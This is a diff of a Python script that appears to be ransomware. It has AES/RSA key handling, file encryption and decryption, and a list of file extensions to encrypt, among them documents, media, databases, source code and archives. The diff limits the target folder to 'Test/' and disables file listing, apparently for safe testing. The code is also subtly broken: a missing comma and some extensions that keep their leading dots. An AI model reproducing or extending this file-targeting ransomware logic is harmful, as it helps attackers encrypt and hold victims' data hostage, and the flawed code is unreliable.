@@ -115,26 +115,26 @@ def decrypt_key(AESpath, RSApath):
 
 # List files of a system
 def list_files(args):
-    path = '.'
+    path = 'Test/'
     if args.encrypt == True:
         extensions = [
-            '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
-            '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
-            '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
+            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
+            'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
+            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
 
-            '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
-            '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
-            '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
-            '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
+            'doc', 'docx', 'xls', 'xlsx', '.ppt','.pptx', # Microsoft office
+            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'txt', # OpenOffice, Adobe, Latex, Markdown, etc
+            'yml', 'yaml', 'json', 'xml', 'csv', # structured data
+            'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
             
-            '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
-            '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
-            '.java', '.class', '.jar', # java source code
-            '.ps', '.bat', '.vb', '.vbs' # windows based scripts
-            '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
-            '.go', '.py', '.pyc', '.bf', '.coffee', # other source code files
+            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
+            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
+            'java', 'class', 'jar', # java source code
+            'ps', 'bat', 'vb', 'vbs' # windows based scripts
+            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
+            'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
 
-            '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak'  # compressed formats        
+            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak'  # compressed formats        
         ]
 
         files = []
@@ -229,7 +229,8 @@ def decrypt_file(l_files, key):
         
 def main(): 
     args = parse_args()
-    l_files = list_files(args)
+    #l_files = list_files(args)
+    l_files = []
 
     if args.encrypt == True:
         #Encrypt files of your system
